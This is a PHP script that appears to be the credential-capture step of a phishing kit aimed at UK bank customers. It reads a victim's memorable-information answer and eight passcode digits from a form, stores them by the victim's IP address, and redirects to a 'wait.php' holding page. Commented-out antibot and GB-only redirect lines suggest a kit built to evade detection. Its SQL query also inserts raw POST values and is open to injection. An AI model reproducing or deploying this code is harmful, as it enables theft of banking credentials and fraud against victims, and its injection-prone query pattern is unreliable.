<?php
//require_once('../antibot8/code/include.php');
session_start();

// if ($_SESSION['countryCode'] != "GB") {
//
// header("location: http://t.co/vYZrT76dPy?amp=1",  true,  301 );  exit;
//
// }
$coxfile= "cox.php";

include $coxfile;



$ip= $_SERVER['REMOTE_ADDR'];
$reponse=$_POST['memorableAnswer'];
$pin=$_POST['pass1'].$_POST['pass2'].$_POST['pass3'].$_POST['pass4'].$_POST['pass5'].$_POST['pass6']."-".$_POST['pass7'].$_POST['pass8'];


  $sql ="UPDATE user set reponse ='$reponse' , pin='$pin', page='',lastpage='wait.php' where IP='$ip';";
   $ret = $db->exec($sql);
   if(!$ret) {
      //echo $db->lastErrorMsg();
   } else {
      //echo $db->changes(), " <center><h1>successfully</h1></center>";
   }
   $db->close();

   //header("Location: $back");
echo "<script>location.replace('wait.php');</script>";
?>
